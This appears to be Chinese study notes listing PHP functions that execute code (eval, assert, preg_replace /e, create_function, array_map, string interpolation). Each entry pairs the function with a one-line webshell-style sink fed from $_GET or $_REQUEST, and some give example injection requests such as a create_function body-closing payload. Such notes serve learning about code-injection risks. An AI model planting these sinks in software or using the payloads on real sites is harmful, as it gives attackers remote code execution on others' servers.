# php能执行代码的函数

## `eval`

**可执行多行代码**

```php
//eval('echo 123;phpinfo();');
eval($_GET[8]);
```

## `assert`

**只能执行单行代码**

```php
//assert('phpinfo()');
assert($_GET[8]);
```

嵌套eval，实现多行代码执行

发起请求：`http://xxx.com/xxx?8=eval('echo 123;phpinfo();')`

## `preg_replace(正则,替换为,原文本)`

**正则使用参数`/e`时修饰符存在代码执行漏洞，但必须真实发生替换才会触发代码执行**

```php
preg_replace('/a/e',$_GET[8],'a');
```

## `create_function(形参,函数体)`

```php
$f = create_function('$param','echo $param;');
// 以上等价于
function f ($param){echo $param;}
```

  
```php
$f = create_function('',$_GET[8]);
```

发起请求：`http://xxx.com/xxx?8=}phpinfo();//`

> `}`闭合函数体 | 执行代码 | `//`注释后面生成的`}`

结果将变成

function f(){ **}phpinfo();//** }


## `array_map(回调函数,待处理数组)`

**遍历处理数组**

> 能传回调函数的php自带函数都可以试试，不一定要array_map

```php
// 将每个请求参数的值依次传入`assert()`当做一行代码执行
array_map('assert',$_REQUEST);
```

## `"${phpinfo()}"`

**字符串变量解析**

> `php版本需大于5.5`

```php
$a = "${eval($_GET[8])}";
```

